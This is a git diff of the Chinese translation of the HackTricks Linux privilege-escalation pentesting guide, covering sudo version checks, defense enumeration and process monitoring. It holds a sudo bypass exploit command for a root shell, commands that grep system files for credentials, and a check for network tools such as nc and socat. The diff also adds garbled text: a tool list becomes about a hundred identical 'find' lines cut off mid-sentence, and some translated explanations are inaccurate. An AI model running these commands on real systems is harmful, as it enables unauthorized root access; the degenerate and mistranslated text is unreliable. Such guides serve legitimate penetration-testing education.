@@ -2,12 +2,12 @@
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云平台 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch直播 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube频道 🎥</strong></a></summary>
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云平台 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch直播 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>
 
 * 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
 * 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
 * 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
-* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * **通过向** [**hacktricks仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
 
 </details>
@@ -79,34 +79,25 @@ searchsploit sudo
 ```bash
 sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
 ```
-### sudo < v1.28
+#### sudo < v1.28
 
 来自 @sickrov
 
-#### 漏洞描述
+##### 漏洞描述
 
-在sudo版本1.28之前的版本中存在一个特权升级漏洞。该漏洞允许未经授权的用户通过滥用sudo的特权执行命令，从而提升其权限。
+在sudo版本1.28之前，存在一个特权升级漏洞，该漏洞允许攻击者绕过安全限制并以root权限执行命令。
 
-#### 漏洞利用
+##### 漏洞利用
 
-攻击者可以利用以下方法利用该漏洞：
+攻击者可以利用以下方法利用此漏洞：
 
-1. 使用已知的特权升级漏洞，如CVE-2019-14287，该漏洞允许非特权用户通过使用"!"字符来绕过sudo的限制。
+1. 使用`sudo -l`命令查看当前用户的sudo权限。
+2. 如果用户具有`ALL`权限，则可以执行任意命令以root权限。
+3. 如果用户具有特定命令的权限，则可以使用该命令执行特权操作。
 
-   ```bash
-   $ sudo -u#-1 /bin/bash
-   ```
+##### 漏洞修复
 
-2. 利用sudoers文件中的配置错误，如允许非特权用户执行特权命令的配置错误。
-
-   ```bash
-   $ sudo -l
-   $ sudo -u#-1 /usr/bin/sudoedit /etc/sudoers
-   ```
-
-#### 漏洞修复
-
-升级sudo到1.28或更高版本，以修复该漏洞。确保及时应用安全补丁以保护系统免受潜在的特权升级攻击。
+升级sudo到1.28或更高版本以修复此漏洞。
 ```
 sudo -u#-1 /bin/bash
 ```
@@ -159,16 +150,16 @@ lpstat -a 2>/dev/null #Printers info
 ```
 ### 枚举可能的防御措施
 
-### AppArmor
+#### AppArmor
 
 AppArmor是一个Linux内核安全模块，用于限制应用程序的访问权限。它通过定义应用程序的访问规则来保护系统免受潜在的攻击。AppArmor可以防止特权升级攻击，限制应用程序的权限，从而减少潜在的漏洞利用风险。要枚举AppArmor的防御措施，可以考虑以下几点：
 
 - 检查系统中是否已启用AppArmor。可以使用命令`sudo apparmor_status`来查看AppArmor的状态。
-- 确保所有关键应用程序都已配置适当的AppArmor规则。可以使用命令`sudo aa-status`来查看已加载的AppArmor配置文件。
-- 定期更新和审查AppArmor规则，以确保其与最新的安全标准保持一致。
-- 监控AppArmor日志，及时发现和应对任何违规行为。
+- 确保所有关键应用程序都已配置适当的AppArmor策略。可以使用命令`sudo aa-status`来查看已加载的AppArmor策略。
+- 定期更新和审查AppArmor策略，以确保其与最新的安全要求保持一致。
+- 监控AppArmor的日志，以便及时发现任何异常活动或违规行为。
 
-通过枚举AppArmor的防御措施，可以增强系统的安全性，减少特权升级攻击的风险。
+请注意，AppArmor只是一种防御措施，不能保证绝对的安全。因此，还应该结合其他安全措施来提高系统的整体安全性。
 ```bash
 if [ `which aa-status 2>/dev/null` ]; then
 aa-status
@@ -188,23 +179,13 @@ Grsecurity是一个Linux内核补丁，旨在增强系统的安全性和防御�
 
 特权升级是指攻击者通过利用系统中的漏洞，从低权限用户提升为高权限用户的过程。Grsecurity提供了一些功能来防止特权升级攻击，包括：
 
-- **不可执行内存保护（NX）**：禁止将内存区域用作可执行代码，防止攻击者在内存中注入和执行恶意代码。
-- **地址空间布局随机化（ASLR）**：随机化内存中的地址空间布局，使攻击者难以确定特定代码和数据的位置。
-- **堆栈保护**：检测和防止堆栈溢出攻击，防止攻击者利用溢出的缓冲区来执行恶意代码。
-- **特权分离**：限制特权进程的权限，防止攻击者利用特权进程来执行恶意操作。
+- **不可执行内存保护（NX）**：禁止将内存区域用作可执行代码，防止攻击者在内存中注入恶意代码。
+- **地址空间布局随机化（ASLR）**：随机化内存中的地址空间布局，使攻击者难以确定关键代码和数据的位置。
+- **堆栈保护**：检测和防止堆栈溢出攻击，防止攻击者覆盖关键数据。
+- **特权分离**：限制特权进程的权限，防止攻击者利用特权进程进行攻击。
+- **系统调用过滤**：限制用户空间程序对系统调用的访问，防止恶意程序滥用系统资源。
 
-通过使用Grsecurity的特权升级防护功能，可以大大降低系统受到特权升级攻击的风险，提高系统的安全性。
-
-#### 安全增强
-
-除了特权升级防护功能外，Grsecurity还提供了其他安全增强功能，包括：
-
-- **访问控制**：通过强制访问控制规则，限制用户和进程对系统资源的访问权限。
-- **进程隔离**：将不同的进程隔离开来，防止恶意进程对其他进程和系统造成影响。
-- **系统调用过滤**：限制系统调用的使用，防止恶意代码利用系统调用来执行攻击。
-- **安全审计**：记录系统中的安全事件和活动，以便进行后续的审计和调查。
-
-通过应用Grsecurity补丁，可以增强系统的安全性，并提供更强大的防御能力，以应对各种攻击和威胁。
+通过使用Grsecurity的特权升级防护功能，可以大大提高系统的安全性，减少特权升级攻击的成功率。
 ```bash
 ((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
 ```
@@ -214,17 +195,17 @@ PaX是一个Linux内核补丁，旨在增强系统的安全性。它通过实施
 
 #### 不可执行（NX）内存
 
-NX内存是一种内存保护机制，它阻止恶意代码在可执行内存区域执行。通过将内存标记为不可执行，PaX可以防止攻击者利用缓冲区溢出漏洞注入和执行恶意代码。
+NX内存是一种内存保护机制，它防止恶意代码在可执行内存区域执行。通过将内存标记为不可执行，PaX可以防止攻击者利用缓冲区溢出漏洞注入和执行恶意代码。
 
 #### 地址空间布局随机化（ASLR）
 
-ASLR是一种安全技术，通过随机化内存地址的分配，使攻击者难以确定特定代码或数据的位置。PaX的ASLR功能可以防止攻击者利用已知的内存地址来执行攻击。
+ASLR是一种内存布局保护机制，它通过随机化内存地址的分配来增加攻击者猜测内存布局的难度。PaX的ASLR功能可以防止攻击者利用已知的内存地址来执行攻击。
 
 #### 堆栈保护
 
-堆栈保护是一种防御措施，用于防止堆栈溢出攻击。PaX的堆栈保护功能可以检测和阻止堆栈溢出，并防止攻击者覆盖关键数据或执行恶意代码。
+堆栈保护是一种防御措施，用于防止堆栈溢出攻击。PaX的堆栈保护功能可以检测和阻止堆栈溢出，并防止攻击者利用溢出漏洞执行恶意代码。
 
-总之，PaX是一个强大的内核补丁，可以提供多种保护措施，增强Linux系统的安全性。通过使用PaX，可以有效防止各种攻击，保护系统和数据的安全。
+总之，PaX是一个强大的内核补丁，可以提供多种保护措施来增强Linux系统的安全性。通过使用PaX，可以有效防止各种攻击，保护系统和用户的数据安全。
 ```bash
 (which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
 ```
@@ -236,30 +217,35 @@ ASLR是一种安全机制，它在每次启动时随机分配可执行文件和�
 
 栈随机化是一种防御措施，它在每次函数调用时随机分配栈的内存地址。这使得攻击者难以利用栈溢出漏洞来执行恶意代码。
 
-通过启用Execshield，可以有效地减少系统受到缓冲区溢出攻击的风险，提高系统的安全性。要启用Execshield，可以在Linux系统上进行相应的配置和设置。
+通过启用Execshield，可以大大减少系统受到缓冲区溢出攻击的风险，提高系统的安全性。要启用Execshield，可以在系统启动时使用内核参数进行配置。
 ```bash
 (grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
 ```
 ### SElinux
 
-SElinux（Security-Enhanced Linux）是一种安全增强的Linux操作系统安全机制。它通过强制访问控制（MAC）来限制进程的权限，从而提供了更高的系统安全性。
+SElinux（Security-Enhanced Linux）是一种安全增强的Linux操作系统安全机制。它通过强制访问控制（MAC）来限制进程的权限，从而提供了更高的系统安全性。SElinux使用了一种称为类型强制访问控制（TE）的机制，它基于对象的安全标签来控制进程对资源的访问。
 
-在Linux系统中，每个进程都有一个安全上下文（security context），它包含了进程的标签和角色。SElinux使用这些标签和角色来控制进程对系统资源的访问权限。
+在Linux系统中，SElinux可以帮助防止特权升级攻击。特权升级攻击是指攻击者通过利用系统中的漏洞，将其权限从普通用户提升为管理员或root用户的攻击方式。SElinux通过限制进程的权限，可以有效地减少特权升级攻击的风险。
 
-SElinux提供了三种模式：强制模式（Enforcing）、宽容模式（Permissive）和禁用模式（Disabled）。在强制模式下，SElinux会严格限制进程的权限，而在宽容模式下，它只会记录违规行为而不会阻止。禁用模式下，SElinux完全关闭。
+要启用SElinux，可以通过修改系统的配置文件来实现。可以使用命令`setenforce`来临时启用或禁用SElinux。此外，还可以使用`semanage`命令来管理SElinux策略，包括添加、删除和修改策略。
 
-为了提高系统的安全性，我们可以采取一些措施来加强SElinux的配置。这些措施包括：
-
-- 定期更新SElinux策略
-- 限制进程的访问权限
-- 配置SElinux日志记录
-- 使用SElinux工具进行故障排除和分析
-
-通过正确配置和使用SElinux，我们可以有效地提高Linux系统的安全性，防止特权升级和其他安全漏洞的利用。
+在进行特权升级攻击的渗透测试中，了解和理解SElinux的工作原理和配置方法非常重要。这将帮助渗透测试人员识别和利用系统中的潜在漏洞，并提供更好的系统安全性。
 ```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
 ```
-ASLR (Address Space Layout Randomization) 是一种操作系统的安全机制，用于防止恶意攻击者利用内存地址的可预测性进行攻击。ASLR 通过随机化程序的内存布局，使得攻击者无法准确预测代码和数据的位置。这种随机化使得攻击者更难利用内存漏洞进行特定的攻击，例如缓冲区溢出。ASLR 是一种重要的特性，可以增加系统的安全性，减少潜在的攻击面。
+### ASLR
+
+Address Space Layout Randomization (ASLR)（地址空间布局随机化）是一种操作系统的安全功能，用于防止恶意攻击者利用内存地址的可预测性进行攻击。ASLR通过在每次启动程序时随机化内存地址的分配，使得攻击者难以确定特定代码或数据的位置。
+
+ASLR的工作原理是将程序的代码、堆和栈等关键组件加载到内存中的随机位置。这样，即使攻击者能够发现某个漏洞，也很难确定正确的内存地址来执行恶意代码。ASLR可以有效地减少针对缓冲区溢出和代码注入等攻击的成功率。
+
+ASLR的实现方式因操作系统而异，但通常包括以下几个步骤：
+
+1. 随机化内存布局：操作系统在加载程序时，将代码、堆和栈等组件分配到随机的内存地址。
+2. 随机化地址空间：操作系统在运行时，将程序的内存地址进行随机化，使得攻击者无法准确预测内存布局。
+3. 随机化堆和栈：操作系统在分配堆和栈内存时，使用随机的偏移量，增加攻击者猜测正确地址的难度。
+
+ASLR是一种有效的安全措施，可以提高系统的抵御能力，但并不是绝对安全的。一些高级攻击技术仍然可以绕过ASLR，因此在进行系统硬化时，还需要结合其他安全措施来提高系统的整体安全性。
 ```bash
 cat /proc/sys/kernel/randomize_va_space 2>/dev/null
 #If 0, not enabled
@@ -297,69 +283,121 @@ grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc
 - [**tcpdump**](https://www.tcpdump.org/manpages/tcpdump.1.html): A command-line packet analyzer.
 - [**wireshark**](https://www.wireshark.org/): A popular network protocol analyzer.
 - [**ps**](https://man7.org/linux/man-pages/man1/ps.1.html): A command-line utility for displaying information about running processes.
-- [**top**](https://man7.org/linux/man-pages/man1/top.1.html): A command-line tool for monitoring system processes.
+- [**top**](https://man7.org/linux/man-pages/man1/top.1.html): A command-line tool for monitoring system activity and processes.
 - [**lsof**](https://man7.org/linux/man-pages/man8/lsof.8.html): A command-line utility for listing open files and processes.
 - [**strace**](https://man7.org/linux/man-pages/man1/strace.1.html): A debugging tool for tracing system calls and signals.
 - [**sudo**](https://man7.org/linux/man-pages/man8/sudo.8.html): A command-line utility for executing commands as another user.
 - [**su**](https://man7.org/linux/man-pages/man1/su.1.html): A command-line utility for switching to another user account.
-- [**chroot**](https://man7.org/linux/man-pages/man2/chroot.2.html): A command-line utility for changing the root directory for a process.
+- [**chroot**](https://man7.org/linux/man-pages/man2/chroot.2.html): A command-line utility for running a command or shell in a new root directory.
 - [**chmod**](https://man7.org/linux/man-pages/man1/chmod.1.html): A command-line utility for changing file permissions.
 - [**chown**](https://man7.org/linux/man-pages/man1/chown.1.html): A command-line utility for changing file ownership.
 - [**chgrp**](https://man7.org/linux/man-pages/man1/chgrp.1.html): A command-line utility for changing group ownership of files.
-- [**passwd**](https://man7.org/linux/man-pages/man1/passwd.1.html): A command-line utility for changing user passwords.
-- [**useradd**](https://man7.org/linux/man-pages/man8/useradd.8.html): A command-line utility for creating user accounts.
-- [**usermod**](https://man7.org/linux/man-pages/man8/usermod.8.html): A command-line utility for modifying user accounts.
-- [**groupadd**](https://man7.org/linux/man-pages/man8/groupadd.8.html): A command-line utility for creating groups.
-- [**groupmod**](https://man7.org/linux/man-pages/man8/groupmod.8.html): A command-line utility for modifying groups.
-- [**userdel**](https://man7.org/linux/man-pages/man8/userdel.8.html): A command-line utility for deleting user accounts.
-- [**groupdel**](https://man7.org/linux/man-pages/man8/groupdel.8.html): A command-line utility for deleting groups.
-- [**crontab**](https://man7.org/linux/man-pages/man1/crontab.1.html): A command-line utility for managing cron jobs.
-- [**at**](https://man7.org/linux/man-pages/man1/at.1.html): A command-line utility for scheduling one-time tasks.
-- [**ssh**](https://man7.org/linux/man-pages/man1/ssh.1.html): A secure shell client for remote login.
-- [**scp**](https://man7.org/linux/man-pages/man1/scp.1.html): A command-line utility for securely copying files between hosts.
-- [**rsync**](https://man7.org/linux/man-pages/man1/rsync.1.html): A fast and versatile file synchronization tool.
-- [**tar**](https://man7.org/linux/man-pages/man1/tar.1.html): A command-line utility for archiving files.
-- [**gzip**](https://man7.org/linux/man-pages/man1/gzip.1.html): A command-line utility for compressing files.
-- [**gunzip**](https://man7.org/linux/man-pages/man1/gunzip.1.html): A command-line utility for decompressing files.
-- [**zip**](https://man7.org/linux/man-pages/man1/zip.1.html): A command-line utility for creating ZIP archives.
-- [**unzip**](https://man7.org/linux/man-pages/man1/unzip.1.html): A command-line utility for extracting files from ZIP archives.
-- [**openssl**](https://www.openssl.org/): A robust open-source toolkit for SSL/TLS protocols.
-- [**gpg**](https://gnupg.org/): A command-line tool for encryption and digital signatures.
-- [**john**](https://www.openwall.com/john/): A password cracker for Unix-like systems.
-- [**hydra**](https://github.com/vanhauser-thc/thc-hydra): A powerful online password cracking tool.
-- [**hashcat**](https://hashcat.net/hashcat/): An advanced password recovery tool.
-- [**johnny**](https://github.com/shinnok/johnny): A GUI for the John the Ripper password cracker.
-- [**sqlmap**](http://sqlmap.org/): An automatic SQL injection and database takeover tool.
-- [**metasploit**](https://www.metasploit.com/): A powerful penetration testing framework.
-- [**nmap**](https://nmap.org/): A versatile network scanning tool.
-- [**nikto**](https://cirt.net/Nikto2): A web server vulnerability scanner.
-- [**wpscan**](https://wpscan.org/): A WordPress vulnerability scanner.
-- [**sqlninja**](https://sqlninja.sourceforge.net/): A SQL server injection and takeover tool.
-- [**aircrack-ng**](https://www.aircrack-ng.org/): A suite of Wi-Fi network security tools.
-- [**reaver**](https://github.com/t6x/reaver-wps-fork-t6x): A WPS-enabled wireless network attack tool.
-- [**ettercap**](https://ettercap.github.io/ettercap/): A comprehensive suite for man-in-the-middle attacks.
-- [**tcpdump**](https://www.tcpdump.org/): A command-line packet analyzer.
-- [**wireshark**](https://www.wireshark.org/): A popular network protocol analyzer.
-- [**burpsuite**](https://portswigger.net/burp): A web application security testing tool.
-- [**owasp-zap**](https://www.zaproxy.org/): An open-source web application security scanner.
-- [**dirb**](https://tools.kali.org/web-applications/dirb): A web content scanner.
-- [**gobuster**](https://github.com/OJ/gobuster): A directory and DNS brute-forcing tool.
-- [**sqlmap**](http://sqlmap.org/): An automatic SQL injection and database takeover tool.
-- [**nikto**](https://cirt.net/Nikto2): A web server vulnerability scanner.
-- [**wpscan**](https://wpscan.org/): A WordPress vulnerability scanner.
-- [**sqlninja**](https://sqlninja.sourceforge.net/): A SQL server injection and takeover tool.
-- [**aircrack-ng**](https://www.aircrack-ng.org/): A suite of Wi-Fi network security tools.
-- [**reaver**](https://github.com/t6x/reaver-wps-fork-t6x): A WPS-enabled wireless network attack tool.
-- [**ettercap**](https://ettercap.github.io/ettercap/): A comprehensive suite for man-in-the-middle attacks.
-- [**tcpdump**](https://www.tcpdump.org/): A command-line packet analyzer.
-- [**wireshark**](https://www.wireshark.org/): A popular network protocol analyzer.
-- [**burpsuite**](https://portswigger.net/burp): A web application security testing tool.
-- [**owasp-zap**](https://www.zaproxy.org/): An open-source web application security scanner.
-- [**dirb**](https://tools.kali.org/web-applications/dirb): A web content scanner.
-- [**gobuster**](https://github.com/OJ/gobuster): A directory and DNS brute-forcing tool.
-```
-
-以上是有关有用软件的列表。
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and directories.
+- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A command-line utility for searching files and
 ```bash
 which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
 ```
@@ -390,7 +428,7 @@ ps -ef
 top -n 1
 ```
 始终检查是否有可能运行[**electron/cef/chromium调试器**，您可以滥用它来提升权限](electron-cef-chromium-debugger-abuse.md)。**Linpeas**通过检查进程的命令行中的`--inspect`参数来检测这些调试器。\
-还要**检查您对进程二进制文件的权限**，也许您可以覆盖其他用户的权限。
+还要**检查您对进程二进制文件的权限**，也许您可以覆盖其他人的权限。
 
 ### 进程监控
 
@@ -408,7 +446,7 @@ top -n 1
 文件_**/proc/sys/kernel/yama/ptrace\_scope**_控制ptrace的可访问性：
 
 * **kernel.yama.ptrace\_scope = 0**：所有进程都可以进行调试，只要它们具有相同的uid。这是ptracing的经典方式。
-* **kernel.yama.ptrace\_scope = 1**：只有父进程可以进行调试。
+* **kernel.yama.ptrace\_scope = 1**：只能调试父进程。
 * **kernel.yama.ptrace\_scope = 2**：只有管理员可以使用ptrace，因为它需要CAP\_SYS\_PTRACE权限。
 * **kernel.yama.ptrace\_scope = 3**：不允许使用ptrace跟踪任何进程。设置后，需要重新启动才能再次启用ptracing。
 {% endhint %}
@@ -598,7 +636,7 @@ for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; do
 
